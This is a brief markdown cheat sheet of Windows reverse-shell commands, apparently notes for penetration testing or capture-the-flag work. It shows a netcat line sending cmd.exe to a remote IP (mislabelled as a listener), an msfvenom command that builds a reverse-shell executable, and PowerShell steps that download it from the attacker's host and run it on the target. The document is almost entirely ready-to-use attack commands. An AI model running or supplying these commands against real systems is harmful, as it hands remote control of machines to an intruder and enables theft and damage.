## Netcat listener
``` bash
nc.exe 10.23.103.105 4443 –e cmd.exe
```

## MsfVenom Reverse Shell:
``` bash
#move to target machine after established nc foothold
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_Attacker_IP> LPORT=<Your_Port> -f exe > shell.exe
#on windows:
Invoke-WebRequest -Uri http://<Attack_ip>:<PORT>/shell.exe -Outfile shell.exe
#run
.\shell.exe
```